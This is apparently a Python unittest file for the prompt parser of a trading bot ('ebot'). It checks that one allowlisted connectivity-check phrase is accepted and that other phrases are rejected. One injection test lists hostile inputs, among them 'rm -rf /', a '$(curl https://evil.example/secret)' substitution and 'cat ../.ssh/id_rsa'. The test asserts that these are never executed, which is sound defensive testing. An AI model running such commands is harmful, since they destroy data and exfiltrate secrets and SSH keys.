"""Allowlisted prompts never become commands."""

from __future__ import annotations

import os
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))
import guard  # noqa: E402,F401
import subprocess

from ebot.prompts import parse_prompt


class PromptTests(unittest.TestCase):
    def test_dated_phrase_maps_to_massive_smoke(self):
        parsed = parse_prompt(
            "Check Massive connectivity and 260+ daily bars for "
            "XOM, LIN, EQIX, SPY as at 2026-11-04"
        )
        self.assertTrue(parsed["accepted"])
        self.assertEqual(parsed["task"], "massive-smoke")
        self.assertEqual(parsed["session"], "2026-11-04")
        self.assertEqual(parsed["from_date"], "2025-08-01")
        self.assertIn("ebot run massive-smoke --session 2026-11-04", parsed["detail"])

    def test_small_surface_variants_stay_allowlisted(self):
        phrases = [
            "check massive connectivity and 260+ daily bars for xom, lin, eqix and spy as of 2026-11-04.",
            "Check   Massive connectivity and 260 + daily bars for XOM, LIN, EQIX, SPY as at 2026-11-04",
        ]
        for phrase in phrases:
            parsed = parse_prompt(phrase)
            self.assertTrue(parsed["accepted"], phrase)
            self.assertEqual(parsed["session"], "2026-11-04")

    def test_undated_owner_example_is_ambiguous(self):
        parsed = parse_prompt(
            "Check Massive connectivity and historical data availability "
            "for XOM, LIN, EQIX and SPY."
        )
        self.assertFalse(parsed["accepted"])
        self.assertEqual(parsed["reason"], "AMBIGUOUS")

    def test_other_symbols_and_extra_words_are_rejected(self):
        for phrase in (
            "Check Massive connectivity and 260+ daily bars for AAPL as at 2026-11-04",
            "Check Massive connectivity and 260+ daily bars for XOM, LIN, EQIX, SPY as at 2026-11-04 please",
            "buy XOM",
            "",
        ):
            parsed = parse_prompt(phrase)
            self.assertFalse(parsed["accepted"], phrase)

    def test_shell_code_and_urls_are_unsupported_and_not_executed(self):
        calls = []

        def explode(*args, **kwargs):
            calls.append(args)
            raise AssertionError("shell was invoked")

        original_system = os.system
        original_run = subprocess.run
        os.system = explode
        subprocess.run = explode
        try:
            samples = [
                "Check Massive connectivity; rm -rf /",
                "$(curl https://evil.example/secret)",
                "python -c \"print(1)\"",
                "cat ../.ssh/id_rsa",
                "os.system('echo hi')",
            ]
            for phrase in samples:
                parsed = parse_prompt(phrase)
                self.assertFalse(parsed["accepted"], phrase)
                self.assertEqual(parsed["reason"], "UNSUPPORTED", phrase)
        finally:
            os.system = original_system
            subprocess.run = original_run
        self.assertEqual(calls, [])

    def test_impossible_calendar_date_is_rejected(self):
        parsed = parse_prompt(
            "Check Massive connectivity and 260+ daily bars for "
            "XOM, LIN, EQIX, SPY as at 2026-02-31"
        )
        self.assertFalse(parsed["accepted"])
        self.assertEqual(parsed["reason"], "INVALID_DATE")


if __name__ == "__main__":
    unittest.main()
